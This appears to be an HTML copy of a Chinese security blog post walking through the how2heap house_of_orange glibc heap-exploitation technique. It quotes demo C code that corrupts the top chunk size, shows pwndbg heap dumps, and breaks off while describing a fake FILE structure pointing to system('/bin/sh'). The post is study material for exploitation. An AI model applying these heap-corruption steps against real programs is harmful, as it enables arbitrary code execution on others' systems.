<!DOCTYPE html>
<html lang="zh-cn">
  <head><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="description" content="how2heap-5"/><meta name="keywords" content="pwn, QRZ's Blog" /><link rel="alternate" href="/blog/default" title="QRZ's Blog" ><link rel="shortcut icon" type="image/x-icon" href="/blog/favicon.ico?v=2.11.0" />
<link rel="canonical" href="http://www.qrzbing.cn/blog/2019/07/19/how2heap-5/"/>

<link rel="stylesheet" type="text/css" href="/blog/lib/fancybox/jquery.fancybox.css" />
<link rel="stylesheet" type="text/css" href="/blog/css/style.css?v=2.11.0" />

<script id="baidu_push">
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>
<script>
  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":"","latex":false};
</script>

    <title>how2heap-5 - QRZ's Blog</title>
  <meta name="generator" content="Hexo 5.3.0"></head>

  <body><div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/blog/." class="logo">QRZ's Blog</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>

<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list"><a href="/blog/">
        <li class="mobile-menu-item">Home
          </li>
      </a><a href="/blog/archives/">
        <li class="mobile-menu-item">Archives
          </li>
      </a><a href="/blog/tags/">
        <li class="mobile-menu-item">Tags
          </li>
      </a><a href="/blog/categories/">
        <li class="mobile-menu-item">Categories
          </li>
      </a><a href="/blog/about/">
        <li class="mobile-menu-item">About
          </li>
      </a></ul>
</nav>
<div class="container" id="mobile-panel">
      <header id="header" class="header"><div class="logo-wrapper">
  <a href="/blog/." class="logo">QRZ's Blog</a>
</div>

<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
          <a class="menu-item-link" href="/blog/">
            Home
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/blog/archives/">
            Archives
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/blog/tags/">
            Tags
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/blog/categories/">
            Categories
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/blog/about/">
            About
            </a>
        </li>
      </ul></nav>
</header>

      <main id="main" class="main">
        <div class="content-wrapper">
          <div id="content" class="content"><article class="post">
    <header class="post-header">
      <h1 class="post-title">how2heap-5
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2019-07-19
        </span></div>
    </header>

    <div class="post-toc" id="post-toc">
    <h2 class="post-toc-title">Contents</h2>
    <div class="post-toc-content">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#how2heap-5"><span class="toc-text">how2heap - 5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-orange"><span class="toc-text">house_of_orange</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A"><span class="toc-text">解释</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcache-dup"><span class="toc-text">tcache_dup</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A-1"><span class="toc-text">解释</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcache-poisoning"><span class="toc-text">tcache_poisoning</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A-2"><span class="toc-text">解释</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcache-house-of-spirit"><span class="toc-text">tcache_house_of_spirit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A-3"><span class="toc-text">解释</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol>
    </div>
  </div><div class="post-content"><h1 id="how2heap-5"><a href="#how2heap-5" class="headerlink" title="how2heap - 5"></a>how2heap - 5</h1><a id="more"></a>

<h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house_of_orange"></a>house_of_orange</h2><p>Exploiting the Top Chunk (Wilderness) in order to gain arbitrary code execution</p>
<h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><blockquote>
<p>House of Orange的核心在于在没有free函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free函数情况下获取到 unsorted bins。</p>
</blockquote>
<blockquote>
<p>我们知道一开始的时候，整个堆都属于 top chunk，每次申请内存时，就从 top chunk 中划出请求大小的堆块返回给用户，于是 top chunk 就越来越小。当某一次 top chunk 的剩余大小已经不能够满足请求时，就会调用函数 sysmalloc() 分配新内存，这时可能会发生两种情况，一种是直接扩充 top chunk，另一种是调用 mmap 分配一块新的 top chunk。具体调用哪一种方法是由申请大小决定的，为了能够使用前一种扩展 top chunk，需要请求小于阀值 mp_.mmap_threshold：</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br></pre></td></tr></table></figure>
<blockquote>
<p>如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为 128K，并且当前进程使用 mmap()分配的内存块小于设定的最大值，将使用 mmap()系统调用直接向操作系统申请内存。</p>
</blockquote>
<blockquote>
<p>为了能够调用 sysmalloc() 中的 _int_free()，需要 top chunk 大于 MINSIZE，即 0x10</p>
</blockquote>
<blockquote>
<p>当然，还得绕过下面两个限制条件：</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">     at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">          ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">           prev_inuse (old_top) &amp;&amp;</span><br><span class="line">           ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line">  assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE));</span><br></pre></td></tr></table></figure>
<blockquote>
<p>即满足 old_size 小于 nb+MINSIZE，PREV_INUSE 标志位为 1，old_top+old_size 页对齐这几个条件。</p>
</blockquote>
<blockquote>
<p>我们总结一下伪造的top chunk size的要求</p>
<ol>
<li>伪造的size必须要对齐到内存页</li>
<li>size 要大于 MINSIZE(0x10)</li>
<li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li>
<li>size 的 prev inuse 位必须为1<br>之后原有的top chunk就会执行_int_free从而顺利进入unsorted bin中。</li>
</ol>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Firstly, lets allocate a chunk on the heap.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span><span class="number">-16</span>);</span><br></pre></td></tr></table></figure>
<p>首先 malloc 一个 0x400 大小的 chunk：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x602000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 1025,    &#x2F;&#x2F; 0x401</span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通常情况下 ，top chunk 大小为 0x21000，减去 0x400，所以此时的大小为 0x20c00，另外 PREV_INUSE 被设置。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; top_chunk </span><br><span class="line">0x602400 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 134145,    &#x2F;&#x2F; 0x20c01</span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; x&#x2F;20gx 0x602400</span><br><span class="line">0x602400:	0x0000000000000000	0x0000000000020c01  &lt;-- Top Chunk size, prev_inuse</span><br><span class="line">0x602410:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602420:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602430:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602440:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602450:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602460:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602470:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602480:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602490:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>此时我们假设有溢出漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   The heap is usually allocated with a top chunk of size 0x21000</span></span><br><span class="line"><span class="comment">   堆的top chunk一般是0x21000</span></span><br><span class="line"><span class="comment">   Since we&#x27;ve allocate a chunk of size 0x400 already,</span></span><br><span class="line"><span class="comment">   如果我们已经申请了一个大小为 0x400 的chunk</span></span><br><span class="line"><span class="comment">   what&#x27;s left is 0x20c00 with the PREV_INUSE bit set =&gt; 0x20c01.</span></span><br><span class="line"><span class="comment">   这样会剩下一个0x20c00大小的chunk且PREV_INUSE bit被设置，所以值为0x20c01</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,</span></span><br><span class="line"><span class="comment">   堆的边界是页面对齐的。因为 Top chunk 已经是堆上的最后一个 chunk了，它最后也应该是对齐的。</span></span><br><span class="line"><span class="comment">   it must also be page aligned at the end.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Also, if a chunk that is adjacent to the Top chunk is to be freed,</span></span><br><span class="line"><span class="comment">   而且，如果一个临近Top chunk的chunk被free的话，它会被合并进 top chunk中。</span></span><br><span class="line"><span class="comment">   then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.</span></span><br><span class="line"><span class="comment">   Top chunk的PREV_INUSE bit也会被设置。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   So that means that there are two conditions that must always be true.</span></span><br><span class="line"><span class="comment">   这也意味着这两种情况一定是对的：</span></span><br><span class="line"><span class="comment">    1) Top chunk + size has to be page aligned</span></span><br><span class="line"><span class="comment">    Top chunk + size 一定是按页对齐的</span></span><br><span class="line"><span class="comment">    2) Top chunk&#x27;s prev_inuse bit has to be set.</span></span><br><span class="line"><span class="comment">    Top chunk 的 PREV_INUSE 位一定是被设置的</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.</span></span><br><span class="line"><span class="comment">   我们可以通过设置Top chunk的size为0xc00|PREV_INUSE满足这两个条件</span></span><br><span class="line"><span class="comment">   What&#x27;s left is 0x20c01</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Now, let&#x27;s satisfy the conditions</span></span><br><span class="line"><span class="comment">   1) Top chunk + size has to be page aligned</span></span><br><span class="line"><span class="comment">   2) Top chunk&#x27;s prev_inuse bit has to be set.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">top = (<span class="keyword">size_t</span> *) ( (<span class="keyword">char</span> *) p1 + <span class="number">0x400</span> - <span class="number">16</span>);</span><br><span class="line">top[<span class="number">1</span>] = <span class="number">0xc01</span>;</span><br></pre></td></tr></table></figure>
<p>此时 top chunk 的 size 被修改为 0xc01，满足了上面的条件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;20gx 0x602400</span><br><span class="line">0x602400:	0x0000000000000000	0x0000000000000c01</span><br><span class="line">0x602410:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602420:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602430:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602440:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602450:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602460:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602470:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602480:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602490:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>接下来我们申请了一个 0x1000 的 chunk：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">   Now we request a chunk of size larger than the size of the Top chunk.</span></span><br><span class="line"><span class="comment">   现在我们申请了一个比Top chunk大的 chunk</span></span><br><span class="line"><span class="comment">   Malloc tries to service this request by extending the Top chunk</span></span><br><span class="line"><span class="comment">   Malloc 会尝试扩展 Top chunk 满足这一要求</span></span><br><span class="line"><span class="comment">   This forces sysmalloc to be invoked.</span></span><br><span class="line"><span class="comment">   这会强制调用 sysmalloc</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   In the usual scenario, the heap looks like the following</span></span><br><span class="line"><span class="comment">   在通常情况下，堆看起来如下所示：</span></span><br><span class="line"><span class="comment">      |------------|------------|------...----|</span></span><br><span class="line"><span class="comment">      |    chunk   |    chunk   | Top  ...    |</span></span><br><span class="line"><span class="comment">      |------------|------------|------...----|</span></span><br><span class="line"><span class="comment">  heap start                              heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   And the new area that gets allocated is contiguous to the old heap end.</span></span><br><span class="line"><span class="comment">   新的 area 会在旧的堆后面 get allocated</span></span><br><span class="line"><span class="comment">   So the new size of the Top chunk is the sum of the old size and the newly allocated size.</span></span><br><span class="line"><span class="comment">   所以Top chunk 的新 size是旧的size和新申请的size之和。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   In order to keep track of this change in size, malloc uses a fencepost chunk,</span></span><br><span class="line"><span class="comment">   为了跟踪这种大小的变化，malloc使用了fencepost chunk，这是一种临时块。</span></span><br><span class="line"><span class="comment">   which is basically a temporary chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   After the size of the Top chunk has been updated, this chunk gets freed.</span></span><br><span class="line"><span class="comment">   在Top chunk的大小被更新的时候，这个chunk就会被free掉。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   In our scenario however, the heap looks like</span></span><br><span class="line"><span class="comment">   在我们这种情况下，heap看起来是这样的：</span></span><br><span class="line"><span class="comment">      |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">      |    chunk   |    chunk   | Top  ..  |  ...  | new Top |</span></span><br><span class="line"><span class="comment">      |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment"> heap start                            heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   In this situation, the new Top will be starting from an address that is adjacent to the heap end.</span></span><br><span class="line"><span class="comment">   在这种情况下，新的 Top 将会从靠近堆结束的地方开始</span></span><br><span class="line"><span class="comment">   So the area between the second chunk and the heap end is unused.</span></span><br><span class="line"><span class="comment">   所以在第二个chunk和堆结束之间的area是未使用状态的。</span></span><br><span class="line"><span class="comment">   And the old Top chunk gets freed.</span></span><br><span class="line"><span class="comment">   而旧的Top chunk会被free掉</span></span><br><span class="line"><span class="comment">   Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,</span></span><br><span class="line"><span class="comment">   由于我们free掉的这个Top chunk的size大于fastbin的size，它会被放入unsorted bins中。</span></span><br><span class="line"><span class="comment">   it gets added to list of unsorted bins.</span></span><br><span class="line"><span class="comment">   Now we request a chunk of size larger than the size of the top chunk.</span></span><br><span class="line"><span class="comment">   现在我们需要请求一个比top chunk的大小大的 chunk。</span></span><br><span class="line"><span class="comment">   This forces sysmalloc to be invoked.</span></span><br><span class="line"><span class="comment">   这会强制调用 sysmalloc。</span></span><br><span class="line"><span class="comment">   And ultimately invokes _int_free</span></span><br><span class="line"><span class="comment">   最后会调用 _int_free。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Finally the heap looks like this:</span></span><br><span class="line"><span class="comment">      |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment">      |    chunk   |    chunk   | free ..  |  ...  | new Top |</span></span><br><span class="line"><span class="comment">      |------------|------------|------..--|--...--|---------|</span></span><br><span class="line"><span class="comment"> heap start                                             new heap end</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">p2 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br></pre></td></tr></table></figure>
<p>0x1000 &gt; 0xc01，又由于 top chunk 的伪造满足条件，原有的 top chunk 会被放入 unsorted bins 中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x602400 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602400</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p>此时堆的情况如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;4gx p1-0x10+0x400</span><br><span class="line">0x602400:	0x0000000000000000	0x0000000000000be1    &lt;-- old Top chunk</span><br><span class="line">0x602410:	0x00007ffff7dd1b78	0x00007ffff7dd1b78</span><br><span class="line">pwndbg&gt; x&#x2F;4gx p1-0x10+0x400+0xbe0</span><br><span class="line">0x602fe0:	0x0000000000000be0	0x0000000000000010    &lt;-- fencepost chunk 1</span><br><span class="line">0x602ff0:	0x0000000000000000	0x0000000000000011    &lt;-- fencepost chunk 2</span><br><span class="line">pwndbg&gt; x&#x2F;4gx p2-0x10</span><br><span class="line">0x623000:	0x0000000000000000	0x0000000000001011    &lt;-- chunk p2</span><br><span class="line">0x623010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; x&#x2F;4gx p2-0x10+0x1010</span><br><span class="line">0x624010:	0x0000000000000000	0x0000000000020ff1    &lt;-- new Top chunk</span><br><span class="line">0x624020:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>可以看出，old top chunk 的大小由0xc00变为了0xbe0，缩小了0x20，这个缩小的空间被用来放置 fencepost chunk。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Note that the above chunk will be allocated in a different page</span></span><br><span class="line"><span class="comment">  注意到上面的chunk将被分配到一个被mmap的不同页面中，</span></span><br><span class="line"><span class="comment">  that gets mmapped. It will be placed after the old heap&#x27;s end</span></span><br><span class="line"><span class="comment">  它会被放置在旧的堆的后面。</span></span><br><span class="line"><span class="comment">  Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins</span></span><br><span class="line"><span class="comment">  现在我们有一块被释放的 old top chunk，它已经加入看unsorted bins list中</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Here starts phase two of the attack. We assume that we have an overflow into the old</span></span><br><span class="line"><span class="comment">  top chunk so we could overwrite the chunk&#x27;s size.</span></span><br><span class="line"><span class="comment">  接下来开始第二段攻击。我们假设可以通过溢出覆盖old top chunk 的size。</span></span><br><span class="line"><span class="comment">  For the second phase we utilize this overflow again to overwrite the fd and bk pointer</span></span><br><span class="line"><span class="comment">  of this chunk in the unsorted bin list.</span></span><br><span class="line"><span class="comment">  在第二阶段我们再次利用这个溢出以覆盖 unsorted bin list中这一块的fd和bk指针。</span></span><br><span class="line"><span class="comment">  There are two common ways to exploit the current state:</span></span><br><span class="line"><span class="comment">  利用当前的状态有两种方法：</span></span><br><span class="line"><span class="comment">    - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)</span></span><br><span class="line"><span class="comment">    通过设置相应指针实现任意地址的分配（需要至少分配两次）</span></span><br><span class="line"><span class="comment">    - Use the unlinking of the chunk for an *where*-controlled write of the</span></span><br><span class="line"><span class="comment">      libc&#x27;s main_arena unsorted-bin-list. (requires at least one allocation)</span></span><br><span class="line"><span class="comment">    使用 chunk 的 unlink 来进行libc 的 main arena unsorted-bin-list 的控制写入（需要至少一次分配）</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  The former attack is pretty straight forward to exploit, so we will only elaborate</span></span><br><span class="line"><span class="comment">  on a variant of the latter, developed by Angelboy in the blog post linked above.</span></span><br><span class="line"><span class="comment">  之前那种攻击很容易被利用，所以我们会详细说明后者的变体，由 Angelboy 的上面的博客链接开发。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  The attack is pretty stunning, as it exploits the abort call itself, which</span></span><br><span class="line"><span class="comment">  is triggered when the libc detects any bogus state of the heap.</span></span><br><span class="line"><span class="comment">  这个攻击的效果非常惊人，它是利用终止调用本身进行的攻击。当libc检测到了任何虚假状态时就能触发。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Whenever abort is triggered, it will flush all the file pointers by calling</span></span><br><span class="line"><span class="comment">  _IO_flush_all_lockp. Eventually, walking through the linked list in</span></span><br><span class="line"><span class="comment">  _IO_list_all and calling _IO_OVERFLOW on them.</span></span><br><span class="line"><span class="comment">  一旦触发了 trigger，它会通过调用 _IO_flush_all_lockp 清空所有的文件指针。最后，遍历 _IO_list_all 的列表并调用其中的 _IO_OVERFLOW。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose</span></span><br><span class="line"><span class="comment">  _IO_OVERLOW points to system and whose first 8 bytes are set to &#x27;/bin/sh&#x27;, 